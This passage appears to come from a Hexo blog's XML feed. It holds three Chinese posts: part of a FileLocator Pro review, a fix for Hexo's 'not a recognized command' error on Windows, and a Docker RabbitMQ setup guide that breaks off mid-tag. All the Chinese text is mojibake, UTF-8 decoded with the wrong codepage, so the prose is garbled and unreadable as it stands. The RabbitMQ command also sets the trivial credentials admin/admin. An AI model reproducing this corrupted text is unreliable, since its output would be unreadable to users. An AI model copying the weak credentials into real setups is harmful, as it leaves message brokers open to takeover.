æ–‡ä»¶åˆ—è¡¨åŒºï¼šæ‰€æœ‰æ»¡è¶³å…³é”®æ¡ä»¶çš„æ–‡ä»¶éƒ½ä¼šåœ¨è¿™é‡Œæ˜¾ç¤ºã€‚æ­¤åŒºåŸŸæ”¯æŒå…¨éƒ¨é»˜è®¤çš„èµ„æºç®¡ç†å™¨åŠ¨ä½œï¼ŒåŒ…æ‹¬ç›´æ¥æ‹–æ”¾æ–‡ä»¶è‡³æ–°ä½ç½®ã€é‡å‘½åç­‰ã€‚</p><p>3. å†…ç½®æŸ¥çœ‹å™¨ï¼šå¯å®šä½ã€é«˜äº®æ˜¾ç¤ºæ–‡ä»¶ä¸­çš„å…³é”®è¯ï¼Œä½†ä¸å¯å¯¹åŸå†…å®¹è¿›è¡Œä¿®æ”¹ã€‚å¹¸å¥½ FileLocator Pro è¿˜æ”¯æŒå¤šæ¬¾ä¸»æµæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå…·ä½“å‚è€ƒä¸‹æ–‡ç‰¹ç‚¹<br />ç¬¬4æ¡ã€‚</p><h2 id="å…­é¡¹ç‰¹è‰²åŠŸèƒ½"><a class="markdownIt-Anchor" href="#å…­é¡¹ç‰¹è‰²åŠŸèƒ½"></a> å…­é¡¹ç‰¹è‰²åŠŸèƒ½</h2><p>FileLocator Pro ç‰¹æ€§ä¼—å¤šï¼Œç½—åˆ—åœ¨ <a href="http://mythicsoft.com/filelocatorpro">å®˜ç½‘</a>æœ€ä¸‹æ–¹ã€‚å› ä¸ºè½¯ä»¶æœ¬èº«æ”¯æŒ30å¤©æ— åŠŸèƒ½é™åˆ¶è¯•ç”¨ï¼Œä¸”æ”¯æŒ32/64 ä½çš„ Win XP â€“ Win 8(åŒ…æ‹¬ä¹‹é—´æ‰€æœ‰serverç‰ˆæœ¬)ï¼Œå¾ˆå¤šé—ªå…‰ç‚¹éƒ½å¯åœ¨æ‚¨ä½¿ç”¨ä¸­æ…¢æ…¢æŒ–æ˜ã€‚æœ¬ç¯‡é™äºç¯‡å¹…ï¼Œå°±ä»‹ç»å…¶ä¸­å…­ä¸ªå…³é”®ç‚¹ï¼š</p><h3 id="1-å…¨æ–‡æ£€ç´¢-æ”¯æŒ50æ–‡æ¡£æ ¼å¼-ä»¥åŠ-ä¸­æ–‡å­—ç¬¦"><a class="markdownIt-Anchor" href="#1-å…¨æ–‡æ£€ç´¢-æ”¯æŒ50æ–‡æ¡£æ ¼å¼-ä»¥åŠ-ä¸­æ–‡å­—ç¬¦"></a> 1. å…¨æ–‡æ£€ç´¢ â€“ æ”¯æŒ50+æ–‡æ¡£æ ¼å¼ ä»¥åŠ ä¸­æ–‡å­—ç¬¦</h3><p>FileLocator Pro å®‰è£…å®Œæˆåå°±é»˜è®¤æ”¯æŒå¸¸è§çš„ Officeä»¥åŠ PDF ç­‰å¤§éƒ¨åˆ†ä¸»æµæ–‡æ¡£æ ¼å¼ã€‚è€Œå®˜æ–¹æ¨èç”¨æˆ·åŒæ—¶å®‰è£… MicrosoftOffice 2010ç­›é€‰åŒ…( å¾®è½¯å®˜ç½‘[ä¸‹è½½](<a href="http://www.microsoft.com/zh-">http://www.microsoft.com/zh-</a><br />CN/download/details.aspx?id=17062) ) ä¾¿å¯ä½¿è½¯ä»¶æ”¯æŒé¢çš„ 20ä½™ç§æ ¼å¼ï¼Œå…¶ä¸­ä¸»è¦åŒ…æ‹¬ï¼š.docx/ .docm/.pptx/ .pptm/ .xlsx/ .xlsmç­‰ã€‚éšç€ç­›é€‰åŒ…çš„ä¸æ–­æ›´æ–°ï¼Œç›¸ä¿¡ FileLocator Pro çš„æœç´¢èŒƒå›´å’Œæ•ˆç‡ä¹Ÿä¼šæœ‰æ‰€æé«˜ã€‚</p><p>è™½ç„¶è½¯ä»¶ç•Œé¢å·²æœ¬åœ°åŒ–ï¼Œä½†æˆ‘ä»¬å›½å†…ç”¨æˆ·æ›´å…³å¿ƒçš„æ˜¯å®ƒå¯¹ä¸­æ–‡å­—ç¬¦çš„æœç´¢æ˜¯å¦åˆ°ä½ã€‚è¯·æ”¾å¿ƒï¼Œå®˜æ–¹å·²ç»æ”¹è¿›äº†è½¯ä»¶å†…æ ¸ï¼Œç›®å‰èƒ½å¯¹æ‰€æœ‰æ”¯æŒçš„æ ¼å¼çš„ä¸­æ–‡è¿›è¡Œæ£€ç´¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213935470.png" alt="image-20230207213935470" /></p><p>å›¾2: æœ€å¸¸è§çš„å‡ ç§æ–‡æ¡£ä¸­éƒ½èƒ½æœç´¢åˆ°ä¸­æ–‡ï¼ŒåŒ…æ‹¬ PDF !</p><h3 id="2-æ·±åº¦æœç´¢-æœç´¢å‹ç¼©åŒ…å†…çš„æ–‡ä»¶"><a class="markdownIt-Anchor" href="#2-æ·±åº¦æœç´¢-æœç´¢å‹ç¼©åŒ…å†…çš„æ–‡ä»¶"></a> 2. æ·±åº¦æœç´¢ â€“ æœç´¢å‹ç¼©åŒ…å†…çš„æ–‡ä»¶</h3><p>å‡ºäºå·¥ä½œä¾¿åˆ©çš„è€ƒè™‘ï¼Œæ‰“åŒ…å„æ–‡ä»¶è‡³ä¸€ä¸ªå‹ç¼©åŒ…äº’ç›¸æ‹·è´ä¼ è¾“ååˆ†æ™®åŠã€‚ä½†â€œä¸ä¿®è¾¹å¹…â€çš„æ–‡ä»¶å‘½åä»¥åŠæ—¥ç§¯æœˆç´¯çš„éšæ„ä¿å­˜ä½ç½®ï¼Œå¾ˆå¿«å°±éš¾ä»¥æ‰¾åˆ°æŸä¸€ä¸ªé‡è¦æ–‡ä»¶ã€‚ä¼¼ä¹é€ä¸ªæ‰“å¼€å‹ç¼©åŒ…å¯»æ‰¾å¹¶ä¸é è°±ã€‚è€ŒFileLocator Pro å¯ä»¥åœ¨ .rar/ .zip/ .7z ç­‰22ç§ä¸»æµå‹ç¼©æ ¼å¼ä¸‹è½»æ¾å…¨æ–‡æœç´¢ï¼Œè®©è—åŒ¿äºæŸå‹ç¼©åŒ…å†…çš„é‡è¦æ–‡ä»¶å¿«é€Ÿæµ®å‡ºæ°´é¢ (å›¾3)ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213948629.png" alt="image-20230207213948629" /><br />å›¾3: èƒ½ç›´æ¥æœç´¢å‹ç¼©åŒ…å†…çš„æ–‡æ¡£å†…å®¹ï¼Œæ— éœ€è§£å‹</p><h3 id="3-å¸ƒå°”-æ­£åˆ™-dos-è¡¨è¾¾å¼-å¯ç”¨å¤šç§æœç´¢æ–¹å¼-è§„åˆ™"><a class="markdownIt-Anchor" href="#3-å¸ƒå°”-æ­£åˆ™-dos-è¡¨è¾¾å¼-å¯ç”¨å¤šç§æœç´¢æ–¹å¼-è§„åˆ™"></a> 3. å¸ƒå°”/ æ­£åˆ™/ DOS è¡¨è¾¾å¼ â€“ å¯ç”¨å¤šç§æœç´¢æ–¹å¼ã€è§„åˆ™</h3><p>FileLocator Pro é™¤äº†æ”¯æŒæœ€å¸¸è§çš„ çº¯æ–‡æœ¬ è¾“å…¥å…³é”®è¯æœç´¢å¤–ï¼Œè¿˜æ·»åŠ äº† å¸ƒå°”/æ­£åˆ™/DOS<br />è§„åˆ™ï¼Œä»è€Œåšåˆ°çœŸæ­£çµæ´»çš„å®šä½æœç´¢ï¼å½“ç„¶ï¼Œå¦‚æœä½ å¯¹è¿™äº›ä¸“ä¸šçš„è¡¨è¾¾å¼è§„åˆ™ä¸€çªä¸é€šæ— ä»ä¸‹æ‰‹ä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œ FileLocator Proéå¸¸å‹å¥½åœ°ä¸ºæ–°æ‰‹æä¾›äº†è¯¦ç»†çš„ä½¿ç”¨è¯´æ˜(å›¾4)å’Œç®€å•æ˜“æ‡‚çš„â€œè¡¨è¾¾å¼å‘å¯¼â€(å›¾5)ã€‚è€Œè¿™ä¸€åˆ‡ï¼Œåœ¨å…¨ä¸­æ–‡çš„ç•Œé¢ä»¥åŠå¸®åŠ©æ–‡æ¡£ä¸‹ï¼Œå¯è®©å­¦ä¹ æ—¶é—´å¤§å¤§ç¼©çŸ­ã€‚ç›¸ä¿¡ç”¨ä¸äº†å¤šä¹…ä½ å°±èƒ½å®Œå…¨æŒæ¡ã€çµæ´»ä½¿ç”¨ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207213959584.png" alt="image-20230207213959584" /><br />å›¾4: è¡¨è¾¾å¼ä½¿ç”¨ç±»å‹è¯´æ˜</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214019887.png" alt="image-20230207214019887" /><br />å›¾5: ç®€å•æ˜“æ‡‚çš„â€œæ­£åˆ™è¡¨è¾¾å¼å‘å¯¼â€ åŒæ—¶ï¼Œä½¿ç”¨æ—¶é—´æ—¥æœŸä½œä¸ºé¢å¤–æ·»åŠ æ¡ä»¶å¯ä»¥è¿›ä¸€æ­¥ç¼©å°ç»“æœèŒƒå›´ï¼ŒèŠ‚çº¦æ—¶é—´ã€‚</p><h3 id="4-å†…å¤–å…¼å¾—çš„æ–‡æ¡£æŸ¥çœ‹å™¨"><a class="markdownIt-Anchor" href="#4-å†…å¤–å…¼å¾—çš„æ–‡æ¡£æŸ¥çœ‹å™¨"></a> 4. å†…å¤–å…¼å¾—çš„æ–‡æ¡£æŸ¥çœ‹å™¨</h3><p>ä¹‹å‰æåˆ°è¿‡å¯ä»¥ç›´æ¥ä½¿ç”¨å†…ç½®æŸ¥çœ‹å™¨æµè§ˆç¬¦åˆæœç´¢æ¡ä»¶çš„æ–‡æ¡£å…¨æ–‡ï¼Œæ”¯æŒé«˜äº®ã€‚ä¸è¿‡åŠŸèƒ½æœ‰é™ï¼Œåªè¯»æ¨¡å¼æµè§ˆä¸ºæœ€å¤§è½¯è‚‹ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214033121.png" alt="image-20230207214033121" /><br />å›¾6ï¼šç¼–è¾‘å™¨é…ç½®</p><p>å¹¸å¥½ï¼ŒFileLocator Pro ä¸ºä¼—å¤šé«˜çº§ç”¨æˆ·é¢„è®¾äº†8ç§ä¸»æµæ–‡æœ¬ç¼–è¾‘å™¨æ–¹æ¡ˆï¼Œå¦‚ Vimã€EditPlusã€NotePad++ç­‰<br />(å›¾6)ã€‚ç¼–è¾‘å™¨ä½ç½®é€‰å®šåå°±å¯åœ¨ä»¥åç›´æ¥è°ƒç”¨ï¼ŒæŸ¥çœ‹æ–‡æ¡£ã€‚åŒæ—¶ï¼Œè½¯ä»¶è¿˜ä¸ºå„ç¼–è¾‘å™¨é¢„è®¾äº†å‘½ä»¤è¡Œå‚æ•°ï¼Œæ–¹ä¾¿ä¼ é€’é€‰å®šæ–‡æ¡£çš„ è·¯å¾„ åŠ è¡Œå·ã€‚</p><h3 id="5-ä¸ç³»ç»Ÿé«˜åº¦é›†æˆ"><a class="markdownIt-Anchor" href="#5-ä¸ç³»ç»Ÿé«˜åº¦é›†æˆ"></a> 5. ä¸ç³»ç»Ÿé«˜åº¦é›†æˆ</h3><p>é€šè¿‡è®¾ç½®ï¼Œå¯æ·»åŠ å¿«é€Ÿå¯åŠ¨ FileLocator Pro è‡³å³é”®èœå•ï¼›æ›¿æ¢é»˜è®¤çš„èµ„æºç®¡ç†å™¨æœç´¢ï¼›æ”¯æŒçƒ­é”®å¯åŠ¨ã€‚AHKåŒ–å¹¶ä¸å›°éš¾ã€‚</p><h3 id="6-æ–‡ä»¶ç³»ç»Ÿçš„-unicode-æ”¯æŒ"><a class="markdownIt-Anchor" href="#6-æ–‡ä»¶ç³»ç»Ÿçš„-unicode-æ”¯æŒ"></a> 6. æ–‡ä»¶ç³»ç»Ÿçš„ Unicode æ”¯æŒ</h3><p>FileLocator Pro æ˜¯ä»¥ Windows Unicodeç¨‹åºåº“å»ºç«‹èµ·çš„ï¼Œå› æ­¤å¯¹æ–‡ä»¶ç³»ç»Ÿæœç´¢æä¾›äº†å®Œæ•´çš„Unicodeæ”¯æŒï¼Œç±»å‹æœ‰UTF-16LEã€UTF-16BEå’ŒUTF-8ã€‚</p><h2 id="æ›´é«˜æ•ˆä½¿ç”¨-filelocator-pro"><a class="markdownIt-Anchor" href="#æ›´é«˜æ•ˆä½¿ç”¨-filelocator-pro"></a> æ›´é«˜æ•ˆä½¿ç”¨ Filelocator Pro</h2><h3 id="1-å°†-filelocator-pro-å®‰è£…åˆ°-u-ç›˜"><a class="markdownIt-Anchor" href="#1-å°†-filelocator-pro-å®‰è£…åˆ°-u-ç›˜"></a> 1. å°† Filelocator Pro å®‰è£…åˆ° U ç›˜</h3><p>å¾ˆå¤šæœ‹å‹ä¼šæƒ³åˆ°å°† Filelocator Pro è£…åœ¨ U ç›˜è®¾å¤‡ä¸­ï¼Œéšèº«æºå¸¦ï¼Œå³æ’å³ç”¨ã€‚è¦å®ç°è¿™ä¸€ç‚¹å¹¶ä¸éš¾ï¼Œåªéœ€å°†è½¯ä»¶çš„é…ç½®/æ—¥å¿—/æ”¶è— æ–‡ä»¶å¤¹è½¬ç§»åˆ° Uç›˜å®‰è£…ç›®å½•å†…å³å¯ã€‚å…·ä½“çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹(å›¾7)ï¼š<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214051117.png" alt="image-20230207214051117" /><br />å›¾7: å°† FileLocator Pro åˆ¶ä½œæˆä¾¿æºç‰ˆå¹¶ä¸éš¾</p><ol><li><p>æ‰“å¼€ FileLocator Pro é…ç½® â€“ é«˜çº§ â€“ æ–‡ä»¶å¤¹ è®¾ç½®ï¼›</p></li><li><p>å°†æ—¥å¿—/é…ç½®/æ”¶è—æ–‡ä»¶å¤¹çš„ç›®å½•åˆ†åˆ«æ”¹ä¸ºï¼š</p></li></ol><p>(FileLocatorProFolder)\logs\  (FileLocatorProFolder)\config\<br />$(FileLocatorProFolder)\Favorites\</p><ol start="3"><li>ç‚¹å‡»â€œç¡®å®šâ€ä¿å­˜ã€‚</li></ol><h3 id="2-ä¿å­˜æœç´¢æ¡ä»¶-åŠ-å¯¼å‡ºæœç´¢ç»“æœ"><a class="markdownIt-Anchor" href="#2-ä¿å­˜æœç´¢æ¡ä»¶-åŠ-å¯¼å‡ºæœç´¢ç»“æœ"></a> 2. ä¿å­˜æœç´¢æ¡ä»¶ åŠ å¯¼å‡ºæœç´¢ç»“æœ</h3><p>å¦‚æœç»å¸¸ä½¿ç”¨æŸå‡ ä¸ªç‰¹å®šæœç´¢æ¡ä»¶ï¼Œä¸ºä»€ä¹ˆä¸å°†å®ƒä»¬ä¿å­˜èµ·æ¥ä»¥ä¾¿ä»¥åéšæ—¶è°ƒå–å‘¢ï¼Ÿç‚¹å‡»â€œä¿å­˜â€æŒ‰é’®å¯æŠŠå½“å‰æ¡ä»¶ä¿å­˜ä¸º .srfæ ¼å¼å¹¶è‡ªåŠ¨å…³è”ã€‚å½“éœ€è¦çš„æ—¶å€™ï¼Œåªéœ€åŒå‡»è¯¥æ ¼å¼æ–‡ä»¶å°±è‡ªåŠ¨å¯åŠ¨ Filelocator Pro å¹¶è½½å…¥æœç´¢æ¡ä»¶ã€‚å½“ç„¶ï¼Œä¿å­˜è‡³æ”¶è—å¤¹ä¹Ÿæ˜¯ä¸€ä¸ªéå¸¸å¥½çš„æ–¹æ³•<br />(å›¾8)ã€‚<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230207214114620.png" alt="image-20230207214114620" /><br />å›¾8: åˆç†åˆ©ç”¨æ”¶è—å¤¹</p><p>åŒæ—¶ï¼Œæœç´¢ç»“æœä¹Ÿå¯ä¿å­˜ä¸º Textã€CSVã€XML/HTML ç­‰æ ¼å¼å­˜ï¼Œæ–¹ä¾¿å¤„ç†ã€å­˜æ¡£ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å·¥å…·</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hostä¿®æ”¹</tag>
      
      <tag>å°å·¥å…·</tag>
      
      <tag>switchHost</tag>
      
      <tag>FileLocator Pro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEXOå®‰è£…(Win10 64 bit )ï¼Œé‡åˆ°cmdæŠ¥é”™ï¼š&#39;hexo&#39; ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº</title>
    <link href="/2023/01/14/HEXO%E5%AE%89%E8%A3%85(Win10%2064%20bit%20)%EF%BC%8C%E9%81%87%E5%88%B0cmd%E6%8A%A5%E9%94%99%EF%BC%9A&#39;hexo&#39;%20%E4%B8%8D%E6%98%AF%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%8F%AF%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
    <url>/2023/01/14/HEXO%E5%AE%89%E8%A3%85(Win10%2064%20bit%20)%EF%BC%8C%E9%81%87%E5%88%B0cmd%E6%8A%A5%E9%94%99%EF%BC%9A&#39;hexo&#39;%20%E4%B8%8D%E6%98%AF%E5%86%85%E9%83%A8%E6%88%96%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%8F%AF%E8%BF%90%E8%A1%8C%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="hexoå®‰è£…win10-64-bit-é‡åˆ°cmdæŠ¥é”™hexo-ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº"><a class="markdownIt-Anchor" href="#hexoå®‰è£…win10-64-bit-é‡åˆ°cmdæŠ¥é”™hexo-ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº"></a> HEXOå®‰è£…(Win10 64 bit )ï¼Œé‡åˆ°cmdæŠ¥é”™ï¼šâ€˜hexoâ€™ ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº</h2><p>ç”±äºä½¿ç”¨è¦ä½¿ç”¨å¤šä¸ªç‰ˆæœ¬çš„nodeï¼Œä¸‹è½½äº†ä¸ª<code>nvm</code>ã€‚åˆ‡æ¢äº†ç³»ç»Ÿä½¿ç”¨çš„nodeç‰ˆæœ¬ã€‚è¿‡ä¸€æ®µæ—¶é—´ï¼Œä½¿ç”¨<code>hexo</code>æ›´æ–°åšå®¢çš„æ—¶å€™ï¼Œå‘å‡º**'hexoâ€™ä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº**çš„æŠ¥é”™ã€‚<code>node</code>æ¢å›åŸæ¥çš„ç‰ˆæœ¬ä¹Ÿæ˜¯ä¸è¡Œã€‚ç”šè‡³ä»¥å‰ä¸‹è½½çš„ä¸€ç³»åˆ—å·¥å…·éƒ½ä½¿ç”¨ä¸äº†ï¼ˆPSï¼švue)ã€‚</p><p>æŠ˜è…¾æ¥æŠ˜è…¾å»ä¸€ç›´ä¸è¡Œï¼Œç´¢æ€§é‡å¼€ã€‚ğŸ˜¡ğŸ˜¡ğŸ˜¡ğŸ˜¡</p><ol><li><p>ä½¿ç”¨nvmä¸‹è½½ v16.16.0çš„node</p></li><li><p>ä½¿ç”¨v16.16.0çš„nodeï¼Œé…ç½®æ·˜å®é•œåƒã€‚å•¥<strong>node_cache</strong> <strong>node_global</strong>æ ¹æœ¬ä¸ç”¨è®¾ç½® æ–¹ä¾¿çš„å¾ˆ</p></li><li><p>å®‰è£…hexoå•¦</p><p>å®‰è£…çš„2ä¸ªå‘½ä»¤</p><p>npm install hexo-cli -g</p><p>npm install hexo --save</p></li><li><p>æŸ¥çœ‹ç‰ˆæœ¬çš„å‘½ä»¤</p><p>hexo -v</p><p>ç„¶åå¯„äº†</p></li></ol><p>çœ‹åˆ«äººçš„ä¾‹å­å‘¢ï¼Œåˆ°è¿™éƒ½æ˜¯ä¸€å¸†é£é¡ºï¼Œç¨‹åºæ­£å¸¸æ‰§è¡Œï¼Œä½†æ˜¯åˆ°æˆ‘è¿™å°±ï¼Œ<strong>è°¢è°¢ä½ nodeï¼ï¼ï¼ï¼</strong></p><p>ä¸‹é¢æ˜¯è§£å†³ä¹‹é“ï¼Œç»è¿‡æˆ‘ä¸€ç•ªæœç´¢ï¼Œå®éªŒã€‚ç„¶åæ‰¾åˆ°äº†è§£å†³æ–¹æ³•ã€‚</p><p>è¯´æ˜¯è¦é…ç½®ä¸‹ç¯å¢ƒå˜é‡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191052165.png" alt="image-20230114191052165" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191234730.png" alt="image-20230114191234730" /></p><p>ä¸‹é¢ï¼Œå’±å…ˆä»”ç»†çœ‹ä¸‹ï¼Œå®‰è£…å®Œæˆä¹‹åçš„ï¼Œç›®å½•ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191346874.png" alt="image-20230114191346874" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114191545356.png" alt="image-20230114191545356" /></p><p>ä¹‹å‰çœ‹åˆ°å¥½å‡ ä¸ªæ–‡ç« è¯´å§hexoçš„binç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ã€‚ä½†æ˜¯å› ä¸ºå•¥åŸå› <code>hexo.cmd</code>å¹¶æ²¡æœ‰æ”¾åˆ°binç›®å½•é‡Œã€‚å¯¼è‡´æˆ‘è¿™ä¸€ç›´ä¸è¡Œã€‚</p><p>å“¦ï¼Œè¿™ä¹ˆä¸€çœ‹ï¼Œå¤§æ¦‚å°±åªæ€ä¹ˆé…ç½®ç¯å¢ƒå˜é‡äº†å§ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114192037550.png" alt="image-20230114192037550" /></p><p>è¿™ä¸ªä¹‹åï¼Œå’±å†è¿è¡Œä¸€æ¬¡ï¼Œhexoå‘½ä»¤ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114192101364.png" alt="image-20230114192101364" /></p><p>OKï¼Œå¯ç®—æ˜¯æˆåŠŸäº†ã€‚</p><p>å“ˆå“ˆå“ˆå“ˆï¼Œæˆ‘Windowså¯ç®—æ˜¯å¯ä»¥è¿è¡Œè¿™ç©æ„å„¿å•¦ã€‚</p><p>å—¯ï¼Œå¯ä»¥ç»§ç»­åæ§½nodeï¼Œä¸¤å¤©èŠ±å…­å°æ—¶å¼„nodeã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114193212943.png" alt="image-20230114193212943" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230114193248213.png" alt="image-20230114193248213" /></p><p>æ€»ç»“å‡ºç°<code>xxxä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤ï¼Œä¹Ÿä¸æ˜¯å¯è¿è¡Œçš„ç¨‹åº</code>ï¼Œå°±æŠŠæœ‰xxx.cmçš„ç›®å½•è·¯å¾„æ·»åŠ åˆ°ç¯å¢ƒå˜é‡å»ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>node</category>
      
    </categories>
    
    
    <tags>
      
      <tag>node</tag>
      
      <tag>hexo</tag>
      
      <tag>cmd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dockerå®‰è£…RabbitMQå¹¶å®‰è£…å»¶æ—¶é˜Ÿåˆ—æ’ä»¶</title>
    <link href="/2023/01/13/Docker%E5%AE%89%E8%A3%85RabbitMQ%E5%B9%B6%E5%AE%89%E8%A3%85%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6/"/>
    <url>/2023/01/13/Docker%E5%AE%89%E8%A3%85RabbitMQ%E5%B9%B6%E5%AE%89%E8%A3%85%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F">ä¸‹è½½é•œåƒ</a></li><li><a href="#%E5%AE%89%E8%A3%85mq">å®‰è£…MQ</a></li></ul></p><p>[toc]</p><h1 id="dockerå®‰è£…rabbitmqå¹¶å®‰è£…å»¶æ—¶é˜Ÿåˆ—æ’ä»¶"><a class="markdownIt-Anchor" href="#dockerå®‰è£…rabbitmqå¹¶å®‰è£…å»¶æ—¶é˜Ÿåˆ—æ’ä»¶"></a> Dockerå®‰è£…RabbitMQå¹¶å®‰è£…å»¶æ—¶é˜Ÿåˆ—æ’ä»¶</h1><h1 id="ä¸€-rabbitmqç®€ä»‹"><a class="markdownIt-Anchor" href="#ä¸€-rabbitmqç®€ä»‹"></a> ä¸€ã€RabbitMQç®€ä»‹</h1><p>RabbitMQæ˜¯ç”±erlangè¯­è¨€å¼€å‘ï¼ŒåŸºäºAMQPï¼ˆAdvanced Message Queueé«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼‰åè®®å®ç°çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå®ƒæ˜¯ä¸€ç§åº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡æ–¹æ³•ï¼Œæ¶ˆæ¯é˜Ÿåˆ—åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿå¼€å‘ä¸­åº”ç”¨éå¸¸å¹¿æ³›ã€‚</p><h1 id="äºŒ-dockerå®‰è£…rabbitmq"><a class="markdownIt-Anchor" href="#äºŒ-dockerå®‰è£…rabbitmq"></a> äºŒã€dockerå®‰è£…RabbitMQ</h1><h2 id="ä¸‹è½½é•œåƒ"><a class="markdownIt-Anchor" href="#ä¸‹è½½é•œåƒ"></a> ä¸‹è½½é•œåƒ</h2><p>æ–¹å¼ä¸€ï¼šåœ¨çº¿æ‹‰å–</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker pull rabbitmq:3-management<br></code></pre></td></tr></table></figure><p>æ–¹å¼äºŒï¼šä»æœ¬åœ°åŠ è½½</p><p>å·²ç»æä¾›äº†é•œåƒåŒ…ï¼š</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1YEJE4xRLucg9JWU8lFnNrw?pwd=yyds">https://pan.baidu.com/s/1YEJE4xRLucg9JWU8lFnNrw?pwd=yyds</a><br />æå–ç ï¼šyyds</p><p>ä¸Šä¼ åˆ°è™šæ‹Ÿæœºä¸­åï¼Œä½¿ç”¨å‘½ä»¤åŠ è½½é•œåƒå³å¯ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker load -i mq.tar<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…mq"><a class="markdownIt-Anchor" href="#å®‰è£…mq"></a> å®‰è£…MQ</h2><p>æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ¥è¿è¡ŒMQå®¹å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run \<br> -e RABBITMQ_DEFAULT_USER=admin \<br> -e RABBITMQ_DEFAULT_PASS=admin \<br> --name Rabbit \<br> --hostname mq \<br> -p 15672:15672 \<br> -p 5672:5672 \<br> -d \<br> rabbitmq:3-management<br></code></pre></td></tr></table></figure><p>3ã€è®¿é—®<a href="http://192.168.23.132:15672">http://192.168.23.132:15672</a></p><p>è´¦å·å¯†ç é»˜è®¤éƒ½æ˜¯guest</p><p>è¿™é‡Œè´¦å·å¯†ç æ˜¯admin</p><h1 id="ä¸‰-å®‰è£…rabbitmqå»¶æ—¶é˜Ÿåˆ—æ’ä»¶delayed_message_exchange"><a class="markdownIt-Anchor" href="#ä¸‰-å®‰è£…rabbitmqå»¶æ—¶é˜Ÿåˆ—æ’ä»¶delayed_message_exchange"></a> ä¸‰ã€å®‰è£…RabbitMQå»¶æ—¶é˜Ÿåˆ—æ’ä»¶ï¼ˆdelayed_message_exchangeï¼‰</h1><ol><li><p>ä¸‹è½½rabbitmq_delayed_message_exchange-x.ezæ’ä»¶å¹¶ä¸Šä¼ åˆ°æŒ‡å®šæ–‡ä»¶å¤¹ä¸­</p><p>ä¸‹è½½åœ°å€:<a href="https://www.rabbitmq.com/community-plugins.html">https://www.rabbitmq.com/community-plugins.html</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113124427690.png" alt="image-20230113124427690" 